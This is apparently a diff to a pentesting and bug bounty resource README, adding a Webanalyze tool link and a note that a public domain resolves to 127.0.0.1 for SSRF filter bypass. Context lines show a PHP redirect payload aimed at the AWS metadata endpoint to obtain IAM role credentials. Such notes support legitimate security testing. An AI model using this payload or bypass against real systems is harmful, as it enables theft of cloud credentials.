@@ -88,6 +88,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [Tplmap](https://github.com/epinna/tplmap) for SSTI exploitation
 - [PlexTrac](https://plextrac.com/) for reporting
 - [Wappalyzer](https://www.wappalyzer.com/)
+- [Webanalyze](https://github.com/rverton/webanalyze) Port of Wappalyzer for command line
 
 Used in [easyg.rb](https://github.com/seeu-inspace/easyg/blob/main/easyg.rb)
 - [nmap](https://nmap.org/)
@@ -257,6 +258,8 @@ For AWS, bypass some restrictions by hosting this PHP page ([Reference](https://
 ```PHP
 <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
 ```
+
+If needed, the domain `firefox.fr` is a DNS that point to `127.0.0.1`.
 
 ### Authentication vulnerabilities
 
